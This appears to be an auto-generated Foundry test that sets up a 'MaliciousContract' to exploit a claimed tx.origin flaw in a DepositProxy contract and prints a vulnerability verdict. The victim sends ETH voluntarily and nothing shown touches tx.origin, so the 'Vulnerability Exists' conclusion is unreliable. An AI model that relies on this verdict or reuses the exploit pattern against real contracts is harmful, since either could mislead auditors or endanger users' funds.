// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol";

contract MaliciousContract {
    DepositProxy public depositProxy;
    
    // Allows contract to receive ETH
    receive() external payable {}

    function attack() public {
        // Deploy DepositProxy with contract's balance
        depositProxy = new DepositProxy{value: address(this).balance}();
    }
}

contract DepositProxyTest is Test {
    address victim = address(0x1);  // EOA victim
    address attacker = address(0x2);  // EOA attacker
    MaliciousContract malicious;

    function test_txOriginVulnerability() public {
        // Victim has ETH
        vm.deal(victim, 1 ether);
        // Attacker has some ETH for deployment
        vm.deal(attacker, 1 ether);
        
        // Attacker deploys malicious contract
        vm.startPrank(attacker);
        malicious = new MaliciousContract();
        vm.stopPrank();
        
        // Victim is tricked into sending ETH to malicious contract
        vm.prank(victim);
        (bool success, ) = address(malicious).call{value: 1 ether}("");
        require(success, "ETH transfer failed");
        
        // State snapshot before attack
        console2.log("--- BEFORE-Trigger ---");
        console2.log("Malicious contract balance: %s wei", address(malicious).balance);
        
        console2.log("--- Trigger Attack ---");
        // Track attack success status
        bool attackSucceeded;
        vm.startPrank(attacker);
        // Execute attack with error handling
        (attackSucceeded, ) = address(malicious).call(
            abi.encodeWithSignature("attack()")
        );
        vm.stopPrank();
        
        console2.log("--- AFTER-Trigger ---");
        DepositProxy depositProxy = malicious.depositProxy();
        console2.log("Attack success status: %s", attackSucceeded ? "true" : "false");
        console2.log("Post-attack malicious contract balance: %s wei", address(malicious).balance);
        console2.log("DepositProxy contract balance: %s wei", address(depositProxy).balance);
        
        // Final vulnerability check
        string memory verdict;
        if(attackSucceeded && address(depositProxy).balance == 1 ether) {
            verdict = "Vulnerability Exists: The attacker successfully deployed DepositProxy with victim's 1 ETH";
        } else if (!attackSucceeded) {
            verdict = "Vulnerability not Exist: Attack function reverted";
        } else {
            verdict = "Vulnerability not Exist: DepositProxy has incorrect balance";
        }
        console2.log(verdict);
    }
}